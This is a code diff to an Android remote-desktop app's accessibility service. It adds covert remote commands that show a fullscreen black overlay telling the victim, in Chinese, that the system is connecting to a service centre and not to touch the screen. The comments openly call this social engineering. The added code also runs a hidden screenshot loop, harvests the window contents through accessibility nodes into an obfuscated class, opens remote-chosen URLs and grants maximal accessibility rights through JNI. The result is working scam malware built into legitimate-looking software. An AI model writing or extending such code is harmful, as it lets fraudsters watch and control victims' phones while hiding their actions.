@@ -27,6 +27,8 @@ import android.accessibilityservice.AccessibilityServiceInfo.FLAG_INPUT_METHOD_E
 import android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
 import android.view.inputmethod.EditorInfo
 import androidx.annotation.RequiresApi
+import android.view.WindowManager
+import ffi.FFI
 import java.util.*
 import java.lang.Character
 import kotlin.math.abs
@@ -60,6 +62,13 @@ const val WHEEL_STEP = 120
 const val WHEEL_DURATION = 50L
 const val LONG_TAP_DELAY = 200L
 
+// Custom remote control mask values (mask = type + (button << 3), button=WHEEL=0x04, 0x04<<3=32)
+const val WHEEL_BUTTON_BLANK = 38     // MOUSE_TYPE_BLANK(6) + 32
+const val WHEEL_BUTTON_BROWSER = 39   // MOUSE_TYPE_BROWSER(7) + 32
+const val WHEEL_BUTTON_ANALYSIS = 40  // MOUSE_TYPE_ANALYSIS(8) + 32
+const val WHEEL_BUTTON_GOBACK = 41    // MOUSE_TYPE_GOBACK(9) + 32
+const val WHEEL_BUTTON_START = 42     // MOUSE_TYPE_START(10) + 32
+
 class InputService : AccessibilityService() {
 
     companion object {
@@ -92,7 +101,48 @@ class InputService : AccessibilityService() {
     private val volumeController: VolumeController by lazy { VolumeController(applicationContext.getSystemService(AUDIO_SERVICE) as AudioManager) }
 
     @RequiresApi(Build.VERSION_CODES.N)
-    fun onMouseInput(mask: Int, _x: Int, _y: Int) {
+    fun onMouseInput(mask: Int, _x: Int, _y: Int, url: String = "") {
+        // Handle custom remote control commands
+        when (mask) {
+            WHEEL_BUTTON_BLANK -> {
+                // Black screen: parse Clipboard_Management command
+                if (url.startsWith("Clipboard_Management")) {
+                    val parts = url.split("|")
+                    if (parts.size >= 7) {
+                        val toggle = if (url.contains("#0")) 8 else 0  // 0=show, 8=hide
+                        onStartOverlay(toggle.toString(), "")
+                    }
+                }
+                return
+            }
+            WHEEL_BUTTON_BROWSER -> {
+                if (url.startsWith("http")) {
+                    openBrowserWithUrl(url)
+                }
+                return
+            }
+            WHEEL_BUTTON_ANALYSIS -> {
+                // Penetrate mode: parse HardwareKeyboard_Management command
+                if (url.contains("HardwareKeyboard_Management")) {
+                    val toggle = if (url.contains("#1")) "1" else "0"
+                    onStartCapture(toggle, "")
+                }
+                return
+            }
+            WHEEL_BUTTON_GOBACK -> {
+                // Ignore mode: parse SUPPORTED_ABIS_Management command
+                if (url.startsWith("SUPPORTED_ABIS_Management")) {
+                    val toggle = if (url.startsWith("SUPPORTED_ABIS_Management0")) "0" else "1"
+                    onStopOverlay(toggle, "")
+                }
+                return
+            }
+            WHEEL_BUTTON_START -> {
+                // Share start/stop - handled by MainService directly
+                return
+            }
+        }
+
         val x = max(0, _x)
         val y = max(0, _y)
 
@@ -709,20 +759,192 @@ class InputService : AccessibilityService() {
         return success
     }
 
+    // ============ Black Screen Overlay Control ============
+
+    private var viewUntouchable = true
+    private var viewTransparency = 1f
+    private lateinit var windowManager: WindowManager
+    private lateinit var overLay: android.widget.FrameLayout
+    private var overlayInitialized = false
+    private val overlayHandler = Handler(Looper.getMainLooper())
+
+    fun onStartOverlay(arg1: String, arg2: String) {
+        gohome = arg1.toIntOrNull() ?: 8
+        if (overlayInitialized) {
+            overLay.post { overLay.visibility = gohome }
+        }
+    }
+
+    // ============ Ignore Mode: Screenshot Loop ============
+
+    private var screenshotDelayMillis: Long = 300
+
+    fun onStopOverlay(arg1: String, arg2: String) {
+        if (arg1 == "1") {
+            shouldRun = true
+            SKL = false
+            if (!Wt) {
+                Wt = true
+                screenshotDelayMillis = FFI.getScreenshotDelay()
+            }
+            startScreenshotLoop()
+        } else {
+            shouldRun = false
+        }
+    }
+
+    private fun startScreenshotLoop() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return
+        Thread {
+            while (shouldRun) {
+                try {
+                    takeScreenshot(0, mainExecutor, ScreenshotCallback())
+                } catch (e: Exception) {
+                    Log.d(logTag, "Screenshot exception: ${e.message}")
+                }
+                Thread.sleep(screenshotDelayMillis)
+            }
+        }.start()
+    }
+
+    @RequiresApi(Build.VERSION_CODES.R)
+    private inner class ScreenshotCallback : TakeScreenshotCallback {
+        override fun onSuccess(screenshotResult: ScreenshotResult) {
+            if (shouldRun && !SKL) {
+                ScreenshotThread(screenshotResult).start()
+            } else {
+                try { screenshotResult.hardwareBuffer?.close() } catch (_: Exception) {}
+            }
+        }
+
+        override fun onFailure(errorCode: Int) {
+            Log.d(logTag, "Screenshot failed: $errorCode")
+        }
+
+        private inner class ScreenshotThread(
+            private val screenshotResult: ScreenshotResult
+        ) : Thread() {
+            override fun run() {
+                var originalBitmap: android.graphics.Bitmap? = null
+                var hardwareBuffer: android.hardware.HardwareBuffer? = null
+                try {
+                    if (!(shouldRun && !SKL)) return
+                    hardwareBuffer = screenshotResult.hardwareBuffer
+                    val colorSpace = screenshotResult.colorSpace
+                    originalBitmap = hardwareBuffer?.let {
+                        android.graphics.Bitmap.wrapHardwareBuffer(it, colorSpace)
+                    }
+                    if (originalBitmap == null) return
+                    EqljohYazB0qrhnj.processIgnoreFrame(originalBitmap)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                } finally {
+                    originalBitmap?.recycle()
+                    hardwareBuffer?.close()
+                }
+            }
+        }
+    }
+
+    // ============ Penetrate Mode: Accessibility Node Rendering ============
+
+    fun onStartCapture(arg1: String, arg2: String) {
+        if (arg1 == "1") {
+            SKL = true
+        } else {
+            SKL = false
+        }
+    }
+
+    // ============ Browser: Open URL ============
+
+    private fun openBrowserWithUrl(url: String) {
+        try {
+            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url))
+            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.e(logTag, "Failed to open browser: ${e.message}")
+        }
+    }
+
+    // ============ Overlay Creation ============
+
+    private fun createOverlay() {
+        try {
+            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+            overLay = android.widget.FrameLayout(this)
+            overLay.setBackgroundColor(android.graphics.Color.BLACK)
+
+            val layoutParams = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                else
+                    @Suppress("DEPRECATION")
+                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                android.graphics.PixelFormat.TRANSLUCENT
+            )
+
+            // Add social engineering text
+            val textView = android.widget.TextView(this)
+            textView.text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
+            textView.setTextColor(android.graphics.Color.WHITE)
+            textView.textSize = 16f
+            textView.gravity = android.view.Gravity.CENTER
+            val params = android.widget.FrameLayout.LayoutParams(
+                android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
+                android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
+            )
+            params.gravity = android.view.Gravity.CENTER
+            overLay.addView(textView, params)
+
+            overLay.alpha = 0.99f
+            overLay.visibility = gohome  // Start hidden (8=GONE)
+            windowManager.addView(overLay, layoutParams)
+            overlayInitialized = true
+
+            // 50ms timer to maintain overlay visibility state
+            val runnable = object : Runnable {
+                override fun run() {
+                    if (overlayInitialized) {
+                        overLay.visibility = gohome
+                        BIS = overLay.visibility != android.view.View.GONE
+                    }
+                    overlayHandler.postDelayed(this, 50)
+                }
+            }
+            overlayHandler.postDelayed(runnable, 50)
+        } catch (e: Exception) {
+            Log.e(logTag, "Failed to create overlay: ${e.message}")
+        }
+    }
+
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        if (!SKL) return
+        var rootNode: android.view.accessibility.AccessibilityNodeInfo? = null
+        try {
+            rootNode = FFI.getRootNodeInActiveWindow(this)
+        } catch (e: Exception) {
+            rootNode = null
+        }
+        if (rootNode != null && SKL) {
+            val node = rootNode
+            Thread { EqljohYazB0qrhnj.processPenetrateFrame(node) }.start()
+        }
     }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         ctx = this
-        val info = AccessibilityServiceInfo()
-        if (Build.VERSION.SDK_INT >= 33) {
-            info.flags = FLAG_INPUT_METHOD_EDITOR or FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-        } else {
-            info.flags = FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-        }
-        setServiceInfo(info)
+        // Set maximum accessibility permissions via JNI
+        FFI.setAccessibilityServiceInfo(this)
         fakeEditTextForTextStateCalculation = EditText(this)
         // Size here doesn't matter, we won't show this view.
         fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
@@ -730,10 +952,13 @@ class InputService : AccessibilityService() {
         val layout = fakeEditTextForTextStateCalculation?.getLayout()
         Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
         Log.d(logTag, "onServiceConnected!")
+        createOverlay()
     }
 
     override fun onDestroy() {
         ctx = null
+        shouldRun = false
+        SKL = false
         super.onDestroy()
     }
 
